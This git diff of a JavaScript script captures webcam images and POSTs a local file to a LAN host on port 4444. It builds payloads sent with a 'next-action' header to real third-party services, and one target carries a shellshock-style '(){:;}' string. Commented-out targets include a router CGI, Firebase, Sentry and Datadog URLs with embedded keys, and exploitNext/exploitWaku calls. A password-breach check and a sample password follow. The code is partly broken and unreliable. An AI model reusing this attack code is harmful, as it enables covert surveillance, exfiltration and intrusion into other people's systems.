@@ -33,13 +33,14 @@ const webcam = NodeWebcam.create({
   callbackReturn: "location",
   verbose: true
 });
-const izaname = NodeWebcam.create("shot", webcam,async (_, file) => fetch("http://127.0.0.1:8080", { method: "POST", body }));
+const izaname = 'NodeWebcam.create("shot", ${webcam},async (_, file) => fetch("http://127.0.0.1:8080", { method: "POST", body }));'
 //const next = izaname.list(function(list){
 //	var anotherCam = NodeWebcam.list({device:list})
 //	var options = NodeWebcam.create(izaname)
 //	return options
 //});												// headers http://127.0.0.1
-var code = NodeWebcam.capture("generateSh",webcam,async (_,file) => fetch("http://192.168.15.13:4444/alocamento-dinamico"),{method:"POST",headers:'x-frame-options ALLOW',body:require("fs").createReadStream("react.html")});
+var code = NodeWebcam.capture("generateSh",izaname,async (_,file) => fetch("http://192.168.15.13:4444/alocamento-dinamico"),{method:"POST",headers:"x-frame-options ALLOW",body:require("fs").createReadStream("react.html")});
+console.log("feetch nao carregador ainda")
 
 //webcam.capture("shot", (err, data) => {
 //  if (err) {
@@ -79,6 +80,10 @@ const fd = new FormDataLib()
 
 for (const key in code) {
     fd.append(key, JSON.stringify(code[key]))
+}
+
+for (key in code ){
+	fd.append(key,) //XML
 }
 
 console.log(fd.getBuffer().toString())
@@ -126,9 +131,9 @@ function exploitWaku(baseUrl) {
 async function send(baseUrl) {
   const res = await fetch(baseUrl, {
     method: "POST",
-    body: JSON.stringify(fd),
+    body: JSON.stringify(fd.getBuffer),
     headers: {
-      "Content-Type": "application/json",
+      "Content-Type": "application/xml",
       "next-action": "x"
     }
   });
@@ -140,10 +145,13 @@ async function send(baseUrl) {
   console.log("Body:", text);
 }
 
-send("https://app.qualified.com/w/1/37pXYrro6wCZbsU7/messenger");
-
-
-
+send("http://41.231.37.153?(){:;}&")
+//send("http://localhost:3000/remote-config")
+//send("https://app.qualified.com/w/1/37pXYrro6wCZbsU7/messenger");
+//send("http://192.168.15.1/cgi-bin/te_acceso_router.cgi")
+//send("https://client-findup.firebaseio.com/token/AIzaSyATF1QlHR-wIxnWJiqoD9GdLv4OP-mMeoE")
+//send("https://srv.apigw.prod17.dtp.dynatrace.com")
+//send("https://o209747.ingest.us.sentry.io/api/4508915056574464/envelope/?sentry_key=c36ec735e564530732f0d75311d173b6&sentry_version=7&sentry_client=sentry.javascript.browser%")
 // Place the correct URL and uncomment the line
 //exploitNext("https://rum-http-intake.logs.datadoghq.com/v1/input/pub78e1469a8a034c32cc4a7b17fca0acea?ddsource=browser&ddtags=sdk_version%3A3.11.0%2Cenv%3Aproduction%2Cservice%3Ayssy.com.br&batch_time=1766173346226")
 //exploitWaku('https://rum-http-intake.logs.datadoghq.com/v1/input/pub78e1469a8a034c32cc4a7b17fca0acea?ddsource=browser&ddtags=sdk_version%3A3.11.0%2Cenv%3Aproduction%2Cservice%3Ayssy.com.br&batch_time=1766173346226')
@@ -208,13 +216,13 @@ async function hasBeenPwned(password) {
   );
 
   const text = await res.text();
-//	console.log(text)
+	console.log(text)
   return text
     .split("\n")
     .some(line => line.startsWith(suffix));
 }
 
-const password = "123456aA";
+const password = "denise@102030.santos";
 var code =  hasBeenPwned(password);
 if (checkCharTypes(password) !== true) {
   console.log("Senha fraca");
